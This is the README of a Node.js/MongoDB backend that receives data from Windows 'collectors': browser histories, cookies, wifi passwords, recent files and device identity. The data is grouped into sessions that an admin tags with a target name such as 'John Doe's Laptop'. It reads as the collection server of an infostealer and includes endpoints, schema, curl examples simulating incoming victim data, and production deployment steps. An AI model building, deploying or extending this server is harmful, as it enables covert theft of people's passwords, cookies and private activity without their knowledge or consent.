# Backend API Server - MongoDB Atlas Edition

## Overview
Node.js + Express backend that receives data from Windows collectors and stores in MongoDB Atlas.

---

## 🚀 Quick Start

### 1. Install Dependencies
```bash
cd data_project/backend
npm install
```

### 2. Configure MongoDB Atlas

Create/update `.env`:
```env
MONGODB_URI=mongodb+srv://username:password@cluster0.xxxxx.mongodb.net/data_collection?retryWrites=true&w=majority
PORT=8080
```

Replace with your actual MongoDB Atlas connection string.

### 3. Setup Admin Password
```bash
# First time only - creates admin account
curl -X POST http://localhost:8080/api/auth/setup \
  -H "Content-Type: application/json" \
  -d '{"password": "your_secure_password"}'
```

### 4. Start Server
```bash
npm start
```

Server runs on `http://localhost:8080`

---

## 📡 API Endpoints

### Data Collection

#### POST `/api/data`
Receives incremental data from collectors.

**Request Body:**
```json
{
  "session_id": "20251229_143522_x7k9m",
  "type": "chrome",  // or "device_info", "brave", "edge", "wifi", "system", "bookmarks", "cookies", "recent_files"
  "device_info": {...},  // only for type="device_info"
  "data": [...]           // for other types
}
```

**Response:**
```json
{
  "success": true,
  "message": "Data received successfully",
  "session_id": "20251229_143522_x7k9m"
}
```

**Logic:**
- Creates new session if doesn't exist
- Updates existing session with new data type
- Marks `status: "complete"` when ≥5/8 data types collected
- Tracks `items_collected` array for monitoring

---

### Session Management

#### GET `/api/sessions`
List all sessions with pagination.

**Query Params:**
- `page` (default: 1)
- `limit` (default: 20)
- `sort` (default: -created_at)

**Response:**
```json
{
  "success": true,
  "count": 42,
  "data": [
    {
      "_id": "...",
      "session_id": "20251229_143522_x7k9m",
      "target_name": null,
      "device_info": {...},
      "status": "complete",
      "items_collected": ["device_info", "chrome", "brave", ...],
      "created_at": "2025-12-29T14:35:22.000Z",
      "updated_at": "2025-12-29T14:35:45.000Z"
    }
  ]
}
```

#### GET `/api/sessions/:session_id`
Get specific session details.

**Response:**
```json
{
  "success": true,
  "data": {
    "session_id": "20251229_143522_x7k9m",
    "device_info": {...},
    "data": {
      "chrome_history": [...],
      "brave_history": [...],
      "wifi_passwords": [...],
      ...
    }
  }
}
```

#### PATCH `/api/sessions/:session_id`
Update session (add target name).

**Request Body:**
```json
{
  "target_name": "John Doe's Laptop"
}
```

#### DELETE `/api/sessions/:session_id`
Delete a session.

**Response:**
```json
{
  "success": true,
  "message": "Session deleted successfully"
}
```

---

### Authentication

#### POST `/api/auth/setup`
Initial admin password setup (only works if no admin exists).

**Request Body:**
```json
{
  "password": "your_secure_password"
}
```

**Response:**
```json
{
  "success": true,
  "message": "Admin password set successfully"
}
```

#### POST `/api/auth/login`
Verify admin password.

**Request Body:**
```json
{
  "password": "your_password"
}
```

**Response:**
```json
{
  "success": true,
  "message": "Login successful"
}
```

#### POST `/api/auth/update`
Change admin password.

**Request Body:**
```json
{
  "oldPassword": "current_password",
  "newPassword": "new_secure_password"
}
```

---

## 🗄️ Database Schema

### Session Model
```javascript
{
  session_id: String,         // Unique indexed "YYYYMMDD_HHMMSS_RANDOM"
  target_name: String,        // Optional, admin can add later
  device_info: {
    hostname: String,
    username: String,
    userdomain: String,
    ip_address: String,
    timestamp: String
  },
  status: String,             // "partial" or "complete"
  items_collected: [String],  // Array of data types received
  data: {
    chrome_history: Array,
    brave_history: Array,
    edge_history: Array,
    wifi_passwords: Array,
    system_info: Object,
    bookmarks: Object,
    cookies_info: Object,
    recent_files: Array
  },
  created_at: Date,           // Auto-managed
  updated_at: Date            // Auto-managed
}
```

### Admin Model
```javascript
{
  password: String,  // bcrypt hashed
  createdAt: Date,
  updatedAt: Date
}
```

---

## 🔍 Type Mappings

Collector sends `type` parameter, backend maps to database fields:

| Collector Type  | Database Field      |
|----------------|---------------------|
| `chrome`       | `chrome_history`    |
| `brave`        | `brave_history`     |
| `edge`         | `edge_history`      |
| `wifi`         | `wifi_passwords`    |
| `system`       | `system_info`       |
| `bookmarks`    | `bookmarks`         |
| `cookies`      | `cookies_info`      |
| `recent_files` | `recent_files`      |

---

## 🧪 Testing

### 1. Health Check
```bash
curl http://localhost:8080/
```
Response: `{"status":"ok","message":"Data Collection API is running"}`

### 2. Setup Admin
```bash
curl -X POST http://localhost:8080/api/auth/setup \
  -H "Content-Type: application/json" \
  -d '{"password": "admin123"}'
```

### 3. Test Login
```bash
curl -X POST http://localhost:8080/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"password": "admin123"}'
```

### 4. Simulate Collector Data
```bash
# Send device info
curl -X POST http://localhost:8080/api/data \
  -H "Content-Type: application/json" \
  -d '{
    "session_id": "test_20251229_143522",
    "type": "device_info",
    "device_info": {
      "hostname": "TEST-PC",
      "username": "TestUser",
      "ip_address": "192.168.1.100",
      "timestamp": "12/29/2025 14:35:22"
    }
  }'

# Send browser history
curl -X POST http://localhost:8080/api/data \
  -H "Content-Type: application/json" \
  -d '{
    "session_id": "test_20251229_143522",
    "type": "chrome",
    "data": ["https://google.com|Google|1|13342977600000000"]
  }'
```

### 5. Query Sessions
```bash
curl http://localhost:8080/api/sessions
```

---

## 🛡️ Security Considerations

- **Password Hashing**: Uses bcrypt (10 rounds) for admin password
- **CORS**: Enabled for frontend access (configure domains in production)
- **Body Limits**: 50MB max payload (for large browser histories)
- **Error Handling**: Generic error messages to prevent info leakage

---

## 🚀 Production Deployment

### Environment Variables
```env
NODE_ENV=production
MONGODB_URI=mongodb+srv://...
PORT=8080
CORS_ORIGIN=https://yourdomain.com
```

### Process Manager (PM2)
```bash
npm install -g pm2
pm2 start server.js --name data-collector-api
pm2 save
pm2 startup
```

### Nginx Reverse Proxy
```nginx
location /api/ {
    proxy_pass http://localhost:8080/;
    proxy_http_version 1.1;
    proxy_set_header Upgrade $http_upgrade;
    proxy_set_header Connection 'upgrade';
    proxy_set_header Host $host;
    proxy_cache_bypass $http_upgrade;
}
```

---

## 📊 Monitoring

### Check Server Logs
```bash
tail -f logs/server.log  # if logging configured
```

### MongoDB Atlas Monitoring
- View real-time operations in Atlas dashboard
- Check storage usage
- Monitor query performance

---

## 🔧 Troubleshooting

### "Cannot connect to MongoDB"
- Check MONGODB_URI in .env
- Verify network access in Atlas (whitelist IP or use 0.0.0.0/0 for testing)
- Check cluster status in Atlas dashboard

### "Admin already exists"
- Admin can only be setup once
- Use `/api/auth/update` to change password
- Or delete admin document from MongoDB directly

### "Session not found"
- Ensure collector uses consistent session_id format
- Check backend logs for actual session_id received

---

## 📁 File Structure
```
backend/
├── server.js           # Main Express app
├── models/
│   ├── Session.js      # Session schema
│   └── Admin.js        # Admin schema
├── routes/
│   ├── data.js         # Data collection endpoints
│   └── auth.js         # Authentication endpoints
├── package.json
├── .env
└── README.md
```

---

**Last Updated:** 2025-12-29
